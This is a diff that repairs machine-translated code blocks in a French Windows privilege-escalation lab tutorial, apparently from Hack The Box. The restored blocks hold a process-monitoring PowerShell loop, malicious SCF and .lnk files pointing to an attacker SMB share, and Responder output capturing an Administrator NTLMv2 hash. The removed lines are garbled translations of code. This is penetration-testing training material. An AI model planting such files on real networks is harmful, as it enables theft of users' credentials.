@@ -32,13 +32,13 @@ Lors de l'obtention d'un shell en tant qu'utilisateur, il peut y avoir des tâch
 Surveillance des lignes de commande de processus
 
 ```
-tandis que($true)
+while($true)
 {
 
-   $process = Get-WmiObject Win32_Process | Ligne de commande Select-Object
-   Début-Sommeil 1
-   $process2 = Get-WmiObject Win32_Process | Ligne de commande Select-Object
-   Compare-Object -ReferenceObject $process -DifferenceObject $process2
+  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Start-Sleep 1
+  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Compare-Object -ReferenceObject $process -DifferenceObject $process2
 
 }
 
@@ -88,11 +88,11 @@ Dans cet exemple, créons le fichier suivant et nommons-le quelque chose comme 
 Fichier SCF malveillant
 
 ```
-[Coquille]
-Commande=2
+[Shell]
+Command=2
 IconFile=\\10.10.14.3\share\legit.ico
-[Barre des tâches]
-Commande=BasculerBureau
+[Taskbar]
+Command=ToggleDesktop
 
 ```
 
@@ -103,63 +103,66 @@ Ensuite, démarrez Responder sur notre boîte d'attaque et attendez que l'utilis
 Premier répondant
 
 ```
-dsgsec@htb[/htb]$ répondeur sudo -wrf -v -I tun0
-                                          __
-   .----.-----.-----.-----.-----.-----.--| |.-----.----.
-   | _| -__|__ --| _ | _ | | _ || -__| _|
-   |__| |_____|_____| __|_____|__|__|_____||_____|__|
-                    |__|
+dsgsec@htb[/htb]$ sudo responder -wrf -v -I tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
 
-            Répondant NBT-NS, LLMNR et MDNS 3.0.2.0
+           NBT-NS, LLMNR & MDNS Responder 3.0.2.0
 
-   Auteur : Laurent Gaffie (laurent.gaffie@gmail.com)
-   Pour tuer ce script, appuyez sur CTRL-C
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
 
-[+] Empoisonneurs :
-     LLMNR [ON]
-     NBT-NS [ON]
-     DNS/MDNS [ACTIVÉ]
 
-[+] Serveurs :
-     Serveur HTTP [ON]
-     Serveur HTTPS [ON]
-     Proxy WPAD [ON]
-     Proxy d'authentification [NON]
-     Serveur SMB [ON]
-     Serveur Kerberos [ON]
-     Serveur SQL [ON]
-     Serveur FTP [ON]
-     Serveur IMAP [ON]
-     Serveur POP3 [ACTIVÉ]
-     Serveur SMTP [ON]
-     Serveur DNS [ON]
-     Serveur LDAP [ON]
-     Serveur RDP [ON]
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    DNS/MDNS                   [ON]
 
-[+] Option HTTP :
-     Toujours servir EXE [OFF]
-     Servir EXE [OFF]
-     Diffusion de HTML [NON]
-     Proxy en amont [OFF]
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [ON]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
 
-[+] Options d'empoisonnement :
-     Mode analyse [OFF]
-     Forcer l'authentification WPAD [OFF]
-     Forcer l'authentification de base [OFF]
-     Forcer la rétrogradation LM [OFF]
-     Hôtes d'empreintes digitales [ON]
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
 
-[+] Options Génériques :
-     NIC du répondeur [tun2]
-     IP du répondeur [10.10.14.3]
-     Ensemble de défis [aléatoire]
-     Ne pas répondre aux noms ['ISATAP']
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Fingerprint hosts          [ON]
 
-[!] Erreur lors du démarrage du serveur SSL sur le port 443, vérifiez les autorisations ou les autres serveurs en cours d'exécution.
-[+] A l'écoute des événements...
-[SMB] Client NTLMv2-SSP : 10.129.43.30
-[SMB] Nom d'utilisateur NTLMv2-SSP : WINLPE-SRV01\Administrateur
-[SMB] Hachage NTLMv2-SSP : Administrateur ::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>...
+[+] Generic Options:
+    Responder NIC              [tun2]
+    Responder IP               [10.10.14.3]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+
+
+[!] Error starting SSL server on port 443, check permissions or other servers running.
+[+] Listening for events...
+[SMB] NTLMv2-SSP Client   : 10.129.43.30
+[SMB] NTLMv2-SSP Username : WINLPE-SRV01\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>...
 
 ```
 
@@ -219,16 +222,14 @@ Cette attaque ne fonctionne plus sur les hôtes Server 2019, mais nous pouvons o
 Génération d'un fichier .lnk malveillant
 
 ```
-
-$objShell = Nouvel-Objet -ComObject WScript.Shell
+$objShell = New-Object -ComObject WScript.Shell
 $lnk = $objShell.CreateShortcut("C:\legit.lnk")
-$lnk.TargetPath = "\\<IP de l'attaquant>\@pwn.png"
+$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
 $lnk.WindowStyle = 1
 $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
-$lnk.Description = "La navigation vers le répertoire où ce fichier est enregistré déclenchera une demande d'authentification."
+$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
 $lnk.HotKey = "Ctrl+Alt+O"
 $lnk.Save()
-
 ```
 
 Essayez cette technique sur l'hôte cible pour vous familiariser avec la méthodologie et ajouter une autre tactique à votre arsenal lorsque vous rencontrez des environnements où Server 2019 est répandu.
